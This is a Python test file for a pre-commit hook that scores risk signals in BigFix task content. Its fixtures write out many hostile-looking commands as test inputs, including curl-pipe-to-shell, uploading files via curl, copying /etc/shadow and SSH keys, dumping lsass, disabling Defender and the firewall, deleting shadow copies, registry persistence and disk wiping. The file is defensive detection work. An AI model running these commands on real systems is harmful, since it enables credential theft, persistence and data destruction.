#!/usr/bin/env python3
"""Tests for pre_commit_bigfix/bes_content_score_risk.py.

Each risk signal gets a positive case and a near-miss that must not score:
script and session relevance in a Description (W901-W903), unhashed
downloads (W910-W913), base64 in and out of an image context (W920, W921,
W926), decoded payloads (W922, W925, W927), decode-and-run commands (W923),
other encodings (W924), hardcoded secrets (W930), commands that weaken
security (W931), remote script or ActiveX in a Description (W932), the
BigFix-platform, credential, network, execution, persistence, destructive,
Description and reviewability signals (W940-W991, one table of examples
each), then the score, the bands, --fail-score, --weight, --disable, and
main()'s exit codes.
"""

import base64
import gzip
import zlib
from pathlib import Path

import pytest

from pre_commit_bigfix import bes_content_score_risk as hook

EXAMPLES = Path(__file__).parent / "examples"

# a real 1x1 PNG
PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA"
    "60e6kgAAAABJRU5ErkJggg=="
)


def bes(
    description="<p>Nothing to see.</p>",
    actionscript="",
    mime=None,
    extra="",
    title="Example",
):
    """A minimal Task with the given Description HTML and ActionScript body."""
    mime_attr = f' MIMEType="{mime}"' if mime else ""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<BES xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
        'xsi:noNamespaceSchemaLocation="BES.xsd">\n'
        "<Task>\n"
        f"<Title>{title}</Title>\n"
        f"<Description><![CDATA[{description}]]></Description>\n"
        "<Relevance>true</Relevance>\n"
        f"{extra}"
        '<DefaultAction ID="Action1">\n'
        "<Description><PreLink>Click </PreLink><Link>here</Link>"
        "<PostLink> to run.</PostLink></Description>\n"
        f"<ActionScript{mime_attr}><![CDATA[{actionscript}]]></ActionScript>\n"
        "</DefaultAction>\n"
        "</Task>\n"
        "</BES>\n"
    )


def codes(text, **kwargs):
    """The signal codes scored for a BES document's text."""
    findings, _score = hook.score_text(text, **kwargs)
    return [finding.code for finding in findings]


def score(text, **kwargs):
    return hook.score_text(text, **kwargs)[1]


def b64(data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.b64encode(data).decode("ascii")


# --- clean content -------------------------------------------------------------


def test_clean_task_scores_zero():
    assert score(bes(actionscript="wait cmd.exe /c echo hi")) == 0


def test_bundled_good_example_scores_zero():
    raw = (EXAMPLES / "example-test.bes").read_text(encoding="utf-8")
    assert score(raw) == 0


# --- Description: script and session relevance ----------------------------------


@pytest.mark.parametrize(
    "html",
    [
        "<script>var a = 1;</script>",
        '<a href="javascript:doIt()">x</a>',
        '<img src="x.png" onerror="doIt()">',
    ],
)
def test_script_in_description(html):
    assert codes(bes(description=html)) == ["W901"]


def test_word_script_in_prose_is_not_script():
    assert codes(bes(description="<p>Run the script on each computer.</p>")) == []


@pytest.mark.parametrize(
    "html",
    [
        "<p><?relevance number of bes computers ?></p>",
        "<p><?Relevance names of bes sites?></p>",
    ],
)
def test_session_relevance_in_description(html):
    assert codes(bes(description=html)) == ["W902"]


def test_script_and_session_relevance_together():
    html = "<script>var n = EvaluateRelevance('number of bes computers');</script>"
    assert sorted(codes(bes(description=html))) == ["W901", "W902", "W903"]


# --- downloads -------------------------------------------------------------------


def test_download_now_is_unhashed():
    found = codes(bes(actionscript="download now as a.exe https://example.com/a.exe"))
    assert found == ["W910"]


def test_download_now_then_sha1_check_still_scores():
    body = (
        "download now as a.exe https://example.com/a.exe\n"
        'continue if {(sha1 of file "a.exe" of download folder) = "abc"}'
    )
    assert "W910" in codes(bes(actionscript=body))


def test_nohash_prefetch_item():
    body = (
        "begin prefetch block\n"
        "add nohash prefetch item url=https://example.com/a.exe\n"
        "end prefetch block"
    )
    assert codes(bes(actionscript=body)) == ["W911"]


def test_hashed_prefetch_is_fine():
    body = (
        "prefetch a.exe sha1:da39a3ee5e6b4b0d3255bfef95601890afd80709 size:0 "
        "https://example.com/a.exe "
        "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    )
    assert codes(bes(actionscript=body)) == []


def test_commented_download_is_ignored():
    assert codes(bes(actionscript="// download now as a.exe https://x/a.exe")) == []


@pytest.mark.parametrize("url", ["http://example.com/a.exe", "https://10.1.2.3/a.exe"])
def test_plain_http_or_raw_ip_download(url):
    assert sorted(codes(bes(actionscript=f"download now as a.exe {url}"))) == [
        "W910",
        "W912",
    ]


@pytest.mark.parametrize(
    "line",
    [
        "curl -o /tmp/a https://example.com/a",
        "Invoke-WebRequest -Uri https://example.com/a -OutFile a.exe",
        "(New-Object Net.WebClient).DownloadString('https://example.com/a')",
    ],
)
def test_script_download_command(line):
    assert codes(
        bes(actionscript=line, mime="application/x-Fixlet-Windows-PowerShell")
    ) == ["W913"]


def test_download_inside_createfile_payload_is_seen():
    body = (
        "createfile until __EOF\n"
        "curl -o /tmp/a https://example.com/a\n"
        "__EOF\n"
        "wait sh /tmp/run.sh"
    )
    assert codes(bes(actionscript=body)) == ["W913"]


# --- base64 ----------------------------------------------------------------------


def test_real_image_base64_is_low_risk():
    html = f'<img src="data:image/png;base64,{b64(PNG)}">'
    assert codes(bes(description=html)) == ["W920"]
    assert score(bes(description=html)) == hook.WEIGHTS["W920"]


def test_image_label_on_non_image_bytes():
    html = f'<img src="data:image/png;base64,{b64("not an image at all " * 6)}">'
    assert "W926" in codes(bes(description=html))


def test_svg_image_is_scanned_as_text():
    svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
    html = f'<img src="data:image/svg+xml;base64,{b64(svg)}">'
    assert "W927" in codes(bes(description=html))


def test_plain_base64_text_outside_image_context():
    blob = b64("hello world, this is a fairly harmless sentence of text. " * 2)
    assert codes(bes(actionscript=f'setting "x"="{blob}" on now for client')) == [
        "W921"
    ]


def test_hex_hashes_and_short_tokens_are_not_base64():
    body = (
        "prefetch a.exe sha1:da39a3ee5e6b4b0d3255bfef95601890afd80709 size:0 "
        "https://example.com/some/really/long/path/to/AFileNameThatIsLong.exe "
        "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    )
    assert codes(bes(actionscript=body)) == []


def test_url_path_with_a_hash_is_not_base64():
    # CommunityContent links VirusTotal reports like this; the path run
    # `en/file/<sha256>/analysis` looked like base64
    sha = "7ee4f7a0e46e34539e9ed362c32ed751025103ade4cdad75c01ccb558c7015ea"
    url = f"https://www.virustotal.com/en/file/{sha}/analysis/"
    assert codes(bes(description=f'<p><a href="{url}">{url}</a></p>')) == []


def test_base64_of_executable():
    blob = b64(b"MZ\x90\x00" + bytes(range(256)) * 2)
    assert "W922" in codes(bes(actionscript=f"// {blob}\nwait cmd /c echo"))


def test_base64_of_script_rescanned():
    inner = "powershell -c Invoke-WebRequest https://example.com/x -OutFile x.exe"
    found = codes(bes(actionscript=f"wait cmd /c echo {b64(inner)}"))
    assert "W921" in found and "W922" in found and "W927" in found


def test_powershell_encoded_command_is_utf16le():
    inner = "Invoke-WebRequest https://example.com/x -OutFile x.exe".encode("utf-16-le")
    body = f"waithidden powershell.exe -EncodedCommand {b64(inner)}"
    found = codes(bes(actionscript=body))
    assert "W923" in found and "W927" in found


def test_compressed_payload():
    blob = b64(gzip.compress(b"curl -o /tmp/a https://example.com/a\n" * 3))
    found = codes(bes(actionscript=f"wait cmd /c echo {blob}"))
    assert "W925" in found and "W927" in found


def test_nested_layer_message_names_the_path():
    # varied enough that the compressed base64 is past the 80-character minimum
    script = "".join(f"certutil -decode in{n}.txt out{n}.exe\n" for n in range(12))
    inner = b64(zlib.compress(script.encode("ascii")))
    findings, _ = hook.score_text(bes(actionscript=f"wait cmd /c echo {inner}"))
    nested = [f for f in findings if f.code == "W927"]
    assert nested and "base64" in nested[0].message and "zlib" in nested[0].message


def test_decoding_is_depth_limited():
    payload = "certutil -decode a.txt a.exe"
    for _ in range(10):
        payload = b64(payload + " padding padding padding padding padding padding")
    hook.score_text(bes(actionscript=f"wait cmd /c echo {payload}"))  # terminates


# --- decode-and-run commands, other encodings -------------------------------------


@pytest.mark.parametrize(
    "line",
    [
        "wait certutil -decode in.txt out.exe",
        "wait sh -c 'echo x | base64 -d > /tmp/a'",
        "wait powershell -c [Convert]::FromBase64String($x)",
    ],
)
def test_decode_command(line):
    assert "W923" in codes(bes(actionscript=line))


@pytest.mark.parametrize(
    "html",
    [
        "<script>eval(unescape('%61%6c%65%72%74%28%31%29%3b%20'))</script>",
        "<script>var s = String.fromCharCode(97,108,101,114,116,40,49,41);</script>",
        "<script>var s = '\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29\\x3b\\x20"
        "\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29';</script>",
        "<script>var s = atob(x);</script>",
    ],
)
def test_other_obfuscation(html):
    assert "W924" in codes(bes(description=html))


@pytest.mark.parametrize(
    "line",
    [
        "waithidden powershell -c Invoke-Expression $command",
        "waithidden powershell -c iex (Get-Content x.ps1 -Raw)",
        "wait psexec.exe -accepteula -si powershell.exe -File x.ps1",
        'wait sh -c "curl -fsSL https://example.com/i.sh | sh"',
    ],
)
def test_dynamic_or_remote_execution(line):
    assert "W923" in codes(bes(actionscript=line))


# --- hardcoded secrets ------------------------------------------------------------


@pytest.mark.parametrize(
    "line",
    [
        "wait setup.exe /qn AUTHTOKEN=00000000-1111-2222-3333-444444444444",
        "wait tool.exe --password=Hunter2Secret",
        'wait tool.exe api_key: "abcd1234efgh"',
    ],
)
def test_hardcoded_secret(line):
    assert "W930" in codes(bes(actionscript=line))


def test_secret_from_a_parameter_is_fine():
    line = 'wait tool.exe --password={parameter "pw" of action}'
    assert "W930" not in codes(bes(actionscript=line))


@pytest.mark.parametrize("value", ["required", "empty", "impersonate", "system"])
def test_override_password_keyword_is_not_a_secret(value):
    body = f"override wait\nrunas=localuser\npassword={value}\nwait cmd /c echo"
    assert "W930" not in codes(bes(actionscript=body))


@pytest.mark.parametrize(
    "script",
    [
        "TakeSecureFixletAction(a, b, 'Action1', {}, { secret: secretParams });",
        "$PWD = Hash (([GUID]::NewGuid()).guid)",
    ],
)
def test_code_reference_is_not_a_secret(script):
    assert "W930" not in codes(bes(description=f"<script>{script}</script>"))


def test_private_key_and_aws_key_anywhere():
    # built from pieces so this repo's detect-private-key hook stays quiet
    key = "-----BEGIN " + "RSA PRIVATE" + " KEY-----"
    assert "W930" in codes(bes(description=f"<pre>{key}</pre>"))
    aws = "AKIA" + "IOSFODNN7EXAMPLE"
    assert "W930" in codes(bes(actionscript=f"// {aws}"))


# --- commands that weaken security --------------------------------------------------


@pytest.mark.parametrize(
    "line",
    [
        'regset "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion'
        '\\Policies\\System]" "EnableLUA"=dword:00000000',
        "waithidden powershell -c Set-MpPreference -DisableRealtimeMonitoring $true",
        "waithidden netsh advfirewall set allprofiles state off",
        "wait systemctl disable firewalld.service",
        "wait setenforce 0",
        "waithidden cmd.exe /C vssadmin delete shadows /all /quiet",
        "waithidden wevtutil cl Security",
        "wait net localgroup administrators CORP\\someone /add",
        "wait useradd builder",
        "wait csrutil disable",
    ],
)
def test_security_weakening_command(line):
    assert "W931" in codes(bes(actionscript=line))


def test_enabling_uac_is_fine():
    line = (
        'regset "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion'
        '\\Policies\\System]" "EnableLUA"=dword:00000001'
    )
    assert "W931" not in codes(bes(actionscript=line))


def test_security_weakening_inside_createfile_is_seen():
    body = "createfile until EOF\nsystemctl stop firewalld\nEOF\nwait sh x.sh"
    assert "W931" in codes(bes(actionscript=body))


# --- remote script / ActiveX in a Description ------------------------------------------


@pytest.mark.parametrize(
    "html",
    [
        '<script src="https://cdn.example.com/x.js"></script>',
        '<iframe src="//example.com/page"></iframe>',
        "<script>var s = new ActiveXObject('WScript.Shell');</script>",
        "<script>var r = new XMLHttpRequest();</script>",
        "<script>fetch('https://example.com/x');</script>",
        "<script>var c = document.cookie;</script>",
    ],
)
def test_remote_script_or_activex_in_description(html):
    assert "W932" in codes(bes(description=html))


def test_local_inline_script_is_not_remote():
    assert "W932" not in codes(bes(description="<script>var a = 1;</script>"))


# --- W940-W991 ---------------------------------------------------------------------

# code -> ActionScript lines that must each raise it
SCRIPT_CASES = {
    "W940": [
        "wait net stop besclient",
        "wait systemctl disable besclient",
        'delete "C:\\Program Files\\BigFix Enterprise\\BES Client\\__BESData\\x.fxf"',
        "copy new.afxm actionsite.afxm",
    ],
    "W941": [
        'setting "__RelayServer1"="http://relay.example.com:52311/bfmirror/downloads/"'
        ' on "{now}" for client',
    ],
    "W942": [
        "archive now",
        'setting "_BESClient_ArchiveManager_FileSet-Logs"="C:\\logs\\*.log"'
        ' on "{now}" for client',
    ],
    "W945": ['wait {value of setting "next_command" of client}'],
    "W946": ['if {now > "01 Jan 2027 00:00:00 +0000" as time}'],
    "W947": ['if {computer name = "HOST1"}'],
    "W948": ['wait cmd /c {parameter "command"}'],
    "W950": ["wait cp /etc/shadow /tmp/x", 'wait cat "/root/.ssh/id_rsa"'],
    "W951": [
        "wait procdump -ma lsass.exe out.dmp",
        "wait reg save HKLM\\SAM sam.hiv",
        "waithidden powershell -c $c = Get-Credential",
        'wait osascript -e \'display dialog "Password" default answer "" with hidden answer\'',
    ],
    "W952": [
        'regset "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control'
        '\\SecurityProviders\\WDigest]" "UseLogonCredential"=dword:00000001',
    ],
    "W953": [
        'wait curl -F "file=@/etc/hosts" https://example.com/u',
        "waithidden powershell -c Invoke-RestMethod -Uri https://x.example -Method Post",
        "wait scp /tmp/a user@host.example:/tmp/",
    ],
    "W956": [
        "wait curl -k https://x.example/a",
        "wait wget --no-check-certificate https://x",
    ],
    "W957": [
        "wait certutil -addstore root ca.cer",
        "wait security add-trusted-cert -d -r trustRoot ca.cer",
    ],
    "W958": [
        "copy __appendfile C:\\Windows\\System32\\drivers\\etc\\hosts",
        "wait netsh winhttp set proxy proxy.example:8080",
    ],
    "W959": [
        'regset "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server]"'
        ' "fDenyTSConnections"=dword:00000000',
        "waithidden powershell -c Enable-PSRemoting -Force",
        "wait sed -i 's/.*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config",
    ],
    "W960": [
        "waithidden powershell -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
        "waithidden powershell -c Add-Type -TypeDefinition $src",
    ],
    "W961": [
        "wait mshta http://x.example/a.hta",
        "wait regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll",
        'wait wmic process call create "cmd /c x"',
    ],
    "W962": [
        "waithidden powershell -c I`n`v`o`k`e-Item x",
        "wait cmd /c p^o^w^e^r^s^h^e^l^l -c x",
        "wait cmd /c %COMSPEC:~0,1%",
    ],
    "W964": [
        "wait sc stop WinDefend",
        "waithidden powershell -c Stop-Process -Name MsMpEng -Force",
    ],
    "W965": ["wait attrib +h +s C:\\x.exe", "wait touch -t 202001010000 /tmp/x"],
    "W966": ["wait insmod /tmp/x.ko", "wait bcdedit /set testsigning on"],
    "W967": [
        "wait chmod 4755 /tmp/x",
        "wait chmod -R 777 /opt/x",
        "wait icacls C:\\x /grant Everyone:F",
    ],
    "W968": [
        "wait nmap -sS 10.0.0.0/24",
        "wait ./xmrig -o stratum+tcp://pool.example:3333",
    ],
    "W970": [
        'regset "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'
        '\\Image File Execution Options\\sethc.exe]" "Debugger"="cmd.exe"',
        'wait sh -c "echo /tmp/x.so >> /etc/ld.so.preload"',
    ],
    "W971": [
        'regset "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]"'
        ' "X"="C:\\x.exe"',
        "wait schtasks /create /tn x /tr x.exe /sc minute",
        "wait sc create xsvc binPath= C:\\x.exe",
    ],
    "W972": [
        "wait diskpart /s x.txt",
        "wait dd if=/dev/zero of=/dev/sda bs=1M",
        "wait cipher /w:C:\\",
    ],
    "W973": [
        'wait sqlcmd -Q "DROP TABLE dbo.X"',
        "wait sqlcmd -Q \"EXEC xp_cmdshell 'whoami'\"",
    ],
}


@pytest.mark.parametrize(
    ("code", "line"),
    [(code, line) for code, lines in SCRIPT_CASES.items() for line in lines],
)
def test_script_signal(code, line):
    assert code in codes(bes(actionscript=line))


@pytest.mark.parametrize(
    ("code", "line"),
    [
        ("W953", "wait unzip -d out a.zip"),
        ("W962", "wait cmd /c echo %DATE:~10,4%"),
        ("W962", 'waithidden powershell -c "a`r`nb`t"'),
        (
            "W971",
            'regdelete "[HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows'
            '\\CurrentVersion\\Run]" "Dropbox"',
        ),
        (
            "W959",
            'regset "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control'
            '\\Terminal Server]" "fDenyTSConnections"=dword:00000001',
        ),
        ("W948", "wait cmd /c echo {name of operating system}"),
    ],
)
def test_script_signal_near_miss(code, line):
    assert code not in codes(bes(actionscript=line))


@pytest.mark.parametrize(
    ("code", "relevance"),
    [
        ("W947", 'computer name = "HOST1"'),
        ("W950", 'exists file "/etc/shadow"'),
        ("W946", 'now > "01 Jan 2027 00:00:00 +0000" as time'),
    ],
)
def test_relevance_signal(code, relevance):
    extra = f"<Relevance><![CDATA[{relevance}]]></Relevance>\n"
    assert code in codes(bes(extra=extra))


@pytest.mark.parametrize(
    ("code", "kwargs"),
    [
        (
            "W943",
            {"actionscript": "wait curl -X POST https://bes.example:52311/api/actions"},
        ),
        ("W944", {"extra": "<Target><AllComputers>true</AllComputers></Target>\n"}),
        ("W954", {"actionscript": "wait curl -o a https://pastebin.com/raw/abc"}),
        ("W954", {"actionscript": "wait curl -o a https://x.ngrok-free.app/a"}),
        ("W955", {"actionscript": "wait curl -o a https://user:pw@example.com/a"}),
        ("W963", {"actionscript": "wait cmd /c echo \u202eexe.txt"}),
    ],
)
def test_file_signal(code, kwargs):
    assert code in codes(bes(**kwargs))


def test_bom_at_start_is_not_a_hidden_character():
    assert "W963" not in codes("\ufeff" + bes())


@pytest.mark.parametrize(
    ("code", "html"),
    [
        ("W980", '<input type="password" id="pw">'),
        ("W981", '<img src="\\\\server.example\\share\\x.png">'),
        ("W981", '<a href="file://server.example/x">x</a>'),
        ("W982", '<img src="https://example.com/p.gif">'),
        ("W983", '<meta http-equiv="refresh" content="0;url=https://x.example">'),
        ("W983", '<form action="https://x.example/post"></form>'),
        ("W983", '<base href="https://x.example/">'),
        ("W984", '<div style="display:none">x</div>'),
    ],
)
def test_description_signal(code, html):
    assert code in codes(bes(description=html))


def test_data_image_is_not_a_remote_image():
    html = f'<img src="data:image/png;base64,{b64(PNG)}">'
    assert "W982" not in codes(bes(description=html))


def test_large_createfile_payload():
    body = "createfile until EOF\n" + "echo line\n" * 201 + "EOF\nwait sh x.sh"
    assert "W990" in codes(bes(actionscript=body))
    small = "createfile until EOF\n" + "echo line\n" * 50 + "EOF\nwait sh x.sh"
    assert "W990" not in codes(bes(actionscript=small))


def test_read_only_title_that_writes():
    writes = 'regset "[HKEY_LOCAL_MACHINE\\SOFTWARE\\X]" "a"=dword:00000001'
    assert "W991" in codes(bes(title="Check Something", actionscript=writes))
    reads = "wait cmd /c echo hi"
    assert "W991" not in codes(bes(title="Check Something", actionscript=reads))
    assert "W991" not in codes(bes(title="Set Something", actionscript=writes))


def test_upload_plus_credential_store_combination():
    body = "wait cp /etc/shadow /tmp/x\narchive now"
    found = codes(bes(actionscript=body))
    assert {"W942", "W950", "W949"} <= set(found)
    assert "W949" not in codes(bes(actionscript="archive now"))


def test_upload_alone_stays_low():
    assert score(bes(actionscript="archive now")) == hook.WEIGHTS["W942"] < hook.MEDIUM


# --- score, bands, options --------------------------------------------------------


def test_bands():
    assert hook.band(0) == "LOW"
    assert hook.band(24) == "LOW"
    assert hook.band(25) == "MEDIUM"
    assert hook.band(50) == "HIGH"


def test_score_is_sum_of_findings():
    findings, total = hook.score_text(
        bes(actionscript="download now as a.exe http://example.com/a.exe")
    )
    assert (
        total
        == sum(f.points for f in findings)
        == (hook.WEIGHTS["W910"] + hook.WEIGHTS["W912"])
    )


def test_weight_override_and_disable():
    text = bes(actionscript="download now as a.exe http://example.com/a.exe")
    assert score(text, weights={"W910": 1}) == 1 + hook.WEIGHTS["W912"]
    assert codes(text, disabled={"W912"}) == ["W910"]


def write(tmp_path, name, text):
    path = tmp_path / name
    path.write_text(text, encoding="utf-8")
    return str(path)


RISKY = bes(
    description="<script>EvaluateRelevance('names of bes computers')</script>",
    actionscript="download now as a.exe http://example.com/a.exe",
)


def test_main_fails_at_high(tmp_path, capsys):
    assert hook.main([write(tmp_path, "r.bes", RISKY)]) == 1
    out = capsys.readouterr().out
    assert "[E900]" in out and "HIGH" in out


def test_main_passes_below_fail_score(tmp_path, capsys):
    path = write(
        tmp_path, "r.bes", bes(actionscript="download now as a.exe https://x.example/a")
    )
    assert hook.main([path]) == 0
    assert "[W910]" in capsys.readouterr().out


def test_main_fail_score_option(tmp_path):
    path = write(
        tmp_path, "r.bes", bes(actionscript="download now as a.exe https://x.example/a")
    )
    assert hook.main(["--fail-score", "10", path]) == 1


def test_main_weight_and_disable_options(tmp_path):
    path = write(tmp_path, "r.bes", RISKY)
    assert hook.main(["--disable", "W901,W902,W903,W910,W912", path]) == 0
    assert hook.main(["--weight", "W910=100", "--disable", "W901,W902,W903", path]) == 1


def test_main_rejects_a_bad_weight(tmp_path):
    with pytest.raises(SystemExit):
        hook.main(["--weight", "W910", write(tmp_path, "r.bes", RISKY)])


def test_unparsable_file_is_skipped(tmp_path, capsys):
    assert hook.main([write(tmp_path, "bad.bes", "<BES><Task>")]) == 0
    assert "[W908]" in capsys.readouterr().out


# --- review fixes (PR 55) ------------------------------------------------------------


def _corrupt_zip_base64():
    """Base64 of a zip whose deflate stream is damaged."""
    import io
    import random
    import zipfile

    rng = random.Random(55)
    text = "".join(rng.choice("abcdefghij \n") for _ in range(4000)).encode()
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("a.txt", text)
    data = bytearray(buffer.getvalue())
    for offset in range(60, 120):  # inside the compressed data
        data[offset] ^= 0xFF
    return b64(bytes(data))


def test_corrupt_zip_does_not_crash():
    hook.score_text(bes(actionscript=f"wait cmd /c echo {_corrupt_zip_base64()}"))


def test_hex_encoded_executable_is_inspected():
    hex_mz = (b"MZ\x90\x00" + bytes(range(256))).hex()
    assert {"W924", "W922"} <= set(codes(bes(actionscript=f"// {hex_mz}")))


def test_x_escaped_binary_shellcode_is_flagged():
    shellcode = "\\x90" * 16 + "\\xcc\\xeb\\xfe" * 4
    assert "W924" in codes(bes(actionscript=f"// {shellcode}"))


def test_utf8_text_in_percent_encoding_is_not_flagged():
    # UTF-8 for a Japanese file name, as bytes so no hook rewrites it as text
    utf8 = b"\xe6\x97\xa5\xe6\x9c\xac\xe8\xaa\x9e\xe3\x83\x95\xe3\x82\xa1\xe3\x82\xa4"
    japanese = "".join(f"%{b:02X}" for b in utf8)
    assert "W924" not in codes(
        bes(actionscript=f"// https://example.com/{japanese}.zip")
    )


def test_decode_budget_exhausted_still_checks_executables(monkeypatch):
    monkeypatch.setattr(hook, "MAX_DECODED", 200)
    padding = b64(bytes(range(256)) * 2)
    mz = b64(b"MZ\x90\x00" + bytes(range(200)))
    found = codes(bes(actionscript=f"// {padding}\n// {mz}"))
    assert "W922" in found and "W928" in found


def test_w955_does_not_print_the_password(tmp_path, capsys):
    path = tmp_path / "r.bes"
    path.write_text(
        bes(
            actionscript="download now as a.exe https://admin:Hunter2Secret@host.example/a.exe"
        ),
        encoding="utf-8",
    )
    hook.main([str(path)])
    out = capsys.readouterr().out
    assert "[W955]" in out and "Hunter2Secret" not in out and "admin:***@" in out


def test_entity_escaped_bidi_character_is_seen():
    extra = "<MIMEField><Name>x</Name><Value>a&#x202E;b</Value></MIMEField>\n"
    assert "W963" in codes(bes(extra=extra))


def test_entity_escaped_secret_is_seen():
    extra = (
        "<MIMEField><Name>x</Name>"
        "<Value>password=&quot;Hunter2Secret&quot;</Value></MIMEField>\n"
    )
    assert "W930" in codes(bes(extra=extra))


def test_success_criteria_relevance_is_scanned():
    extra = '<SuccessCriteria Option="CustomRelevance">exists file "/etc/shadow"</SuccessCriteria>\n'
    assert "W950" in codes(bes(extra=extra))


def test_svg_rescan_respects_the_decode_budget(monkeypatch):
    monkeypatch.setattr(hook, "MAX_DECODED", 10)
    svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
    found = codes(bes(description=f'<img src="data:image/svg+xml;base64,{b64(svg)}">'))
    assert "W927" not in found and "W928" in found


def test_main_rejects_an_unknown_disable_code(tmp_path):
    path = tmp_path / "r.bes"
    path.write_text(bes(), encoding="utf-8")
    with pytest.raises(SystemExit):
        hook.main(["--disable", "W92l", str(path)])


def test_dtd_entity_is_not_expanded_but_its_text_is_scanned():
    doc = bes(
        extra="<MIMEField><Name>x</Name><Value>&s;</Value></MIMEField>\n"
    ).replace(
        "<BES ",
        '<!DOCTYPE BES [<!ENTITY s "password=Hunter2Secret">]>\n<BES ',
        1,
    )
    found = codes(doc)
    assert "W930" in found and "W929" in found
